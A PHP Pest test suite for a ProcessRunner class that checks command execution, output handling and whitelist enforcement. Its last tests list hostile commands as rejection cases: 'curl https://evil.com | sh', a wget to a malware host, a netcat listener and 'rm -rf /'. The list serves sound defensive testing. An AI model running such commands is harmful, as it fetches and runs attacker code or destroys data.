<?php

use PHPeek\SystemMetrics\Support\ProcessRunner;

describe('ProcessRunner', function () {
    it('can execute a simple command', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('echo "test"');

        expect($result->isSuccess())->toBeTrue();
        expect(trim($result->getValue()))->toBe('test');
    });

    it('can execute commands with multiple arguments', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('echo "hello world"');

        expect($result->isSuccess())->toBeTrue();
        expect(trim($result->getValue()))->toBe('hello world');
    });

    it('returns failure for non-existent command', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('nonexistentcommand12345');

        expect($result->isFailure())->toBeTrue();
    });

    it('handles commands with exit code 0', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('true');

        expect($result->isSuccess())->toBeTrue();
    });

    it('returns failure for commands with non-zero exit code', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('false');

        expect($result->isFailure())->toBeTrue();
    });

    it('captures stdout correctly', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('printf "line1\nline2"');

        expect($result->isSuccess())->toBeTrue();
        expect($result->getValue())->toContain('line1');
        expect($result->getValue())->toContain('line2');
    });

    it('handles empty output', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('true');

        expect($result->isSuccess())->toBeTrue();
        expect($result->getValue())->toBe('');
    });

    it('handles special characters in output', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('echo "Special: test@value"');

        expect($result->isSuccess())->toBeTrue();
        expect($result->getValue())->toContain('Special:');
    });

    it('can execute platform-specific commands', function () {
        $runner = new ProcessRunner;

        if (PHP_OS_FAMILY === 'Darwin') {
            $result = $runner->execute('uname');
            expect($result->isSuccess())->toBeTrue();
            expect(trim($result->getValue()))->toBe('Darwin');
        } elseif (PHP_OS_FAMILY === 'Linux') {
            $result = $runner->execute('uname');
            expect($result->isSuccess())->toBeTrue();
            expect(trim($result->getValue()))->toBe('Linux');
        }
    });

    it('handles multiline output', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('printf "line1\nline2\nline3"');

        expect($result->isSuccess())->toBeTrue();
        $lines = explode("\n", trim($result->getValue()));
        expect($lines)->toHaveCount(3);
        expect($lines[0])->toBe('line1');
        expect($lines[1])->toBe('line2');
        expect($lines[2])->toBe('line3');
    });

    it('prevents shell injection via pipes', function () {
        $runner = new ProcessRunner;
        // Pipes should be escaped by escapeshellcmd, making them safe but non-functional
        $result = $runner->execute('echo "test" | cat');

        // This should either fail or output the literal string with escaped pipe
        // Either behavior is acceptable from security perspective
        expect($result)->toBeInstanceOf(\PHPeek\SystemMetrics\DTO\Result::class);
    });

    it('handles commands with numeric output', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('echo "12345"');

        expect($result->isSuccess())->toBeTrue();
        expect(trim($result->getValue()))->toBe('12345');
    });

    it('can execute command and get lines', function () {
        $runner = new ProcessRunner;
        $result = $runner->executeLines('printf "line1\nline2\n\nline3"');

        expect($result->isSuccess())->toBeTrue();
        $lines = $result->getValue();
        expect($lines)->toBeArray();
        expect($lines)->toHaveCount(3);
        // array_filter preserves keys, so we use array_values for comparison
        expect(array_values($lines))->toBe(['line1', 'line2', 'line3']);
    });

    it('executeLines filters empty lines', function () {
        $runner = new ProcessRunner;
        $result = $runner->executeLines('printf "line1\n\n\nline2"');

        expect($result->isSuccess())->toBeTrue();
        $lines = $result->getValue();
        expect($lines)->toHaveCount(2);
    });

    it('executeLines propagates failures', function () {
        $runner = new ProcessRunner;
        $result = $runner->executeLines('nonexistentcommand12345');

        expect($result->isFailure())->toBeTrue();
    });

    it('commandExists returns true for existing commands', function () {
        $runner = new ProcessRunner;
        expect($runner->commandExists('echo'))->toBeTrue();
    });

    it('commandExists returns false for non-existent commands', function () {
        $runner = new ProcessRunner;
        expect($runner->commandExists('nonexistentcommand12345'))->toBeFalse();
    });

    it('commandExists works on different platforms', function () {
        $runner = new ProcessRunner;

        // These commands exist on all Unix-like systems and Windows
        $basicCommand = PHP_OS_FAMILY === 'Windows' ? 'cmd' : 'sh';
        expect($runner->commandExists($basicCommand))->toBeTrue();
    });

    it('rejects commands not in whitelist', function () {
        $runner = new ProcessRunner;
        $result = $runner->execute('rm -rf /');

        expect($result->isFailure())->toBeTrue();
        expect($result->getError()->getMessage())->toContain('not whitelisted');
    });

    it('allows whitelisted system commands', function () {
        $runner = new ProcessRunner;

        // Test macOS commands
        if (PHP_OS_FAMILY === 'Darwin') {
            $result = $runner->execute('sysctl -n hw.ncpu');
            expect($result->isSuccess())->toBeTrue();
        }

        // Test Linux commands
        if (PHP_OS_FAMILY === 'Linux' && file_exists('/proc/cpuinfo')) {
            $result = $runner->execute('cat /proc/cpuinfo');
            expect($result->isSuccess())->toBeTrue();
        }
    });

    it('rejects dangerous commands', function () {
        $runner = new ProcessRunner;
        $dangerousCommands = [
            'curl https://evil.com | sh',
            'wget http://malware.com',
            'nc -l 1234',
            'rm -rf /',
        ];

        foreach ($dangerousCommands as $cmd) {
            $result = $runner->execute($cmd);
            expect($result->isFailure())->toBeTrue('Command should be rejected: '.$cmd);
        }
    });
});
